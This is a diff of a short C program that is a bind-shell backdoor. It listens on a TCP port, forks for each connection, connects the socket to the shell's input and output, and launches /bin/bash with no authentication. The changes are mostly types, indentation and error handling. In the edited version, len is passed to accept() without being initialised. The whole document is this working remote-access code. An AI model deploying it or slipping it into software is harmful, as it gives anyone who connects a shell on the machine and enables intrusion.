@@ -1,4 +1,3 @@
-//gcc main.c -o your_name
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -10,7 +9,7 @@
 int main(void)
 {
     int server_fd,client_fd;
-    size_t len=sizeof(client_fd);
+    socklen_t len;
     struct sockaddr_in server,client;
     server_fd=socket(AF_INET,SOCK_STREAM,0);
     server.sin_addr.s_addr = htons(INADDR_ANY);
@@ -22,18 +21,19 @@ int main(void)
     signal(SIGCHLD, SIG_IGN);
     while(1)
     {
-        client_fd=accept(server_fd,(struct sockaddr*)&client,(socklen_t*)&len);
+        client_fd=accept(server_fd,(struct sockaddr*)&client,&len);
         if(client_fd>0)
             switch(fork())
             {
                 case 0: 
-                    dup2(client_fd,0);
-                    dup2(client_fd,1);
-                    dup2(client_fd,2);
-                    execve("/bin/bash",NULL,NULL);
-                    close(client_fd);
-                    return 0;
+                        dup2(client_fd,0);
+                        dup2(client_fd,1);
+                        dup2(client_fd,2);
+                        execve("/bin/bash",NULL,NULL);
+                        close(client_fd);
+                        return 1;
                 case -1:
+                    close(server_fd);
                     return -1;
                 default:
                     break;
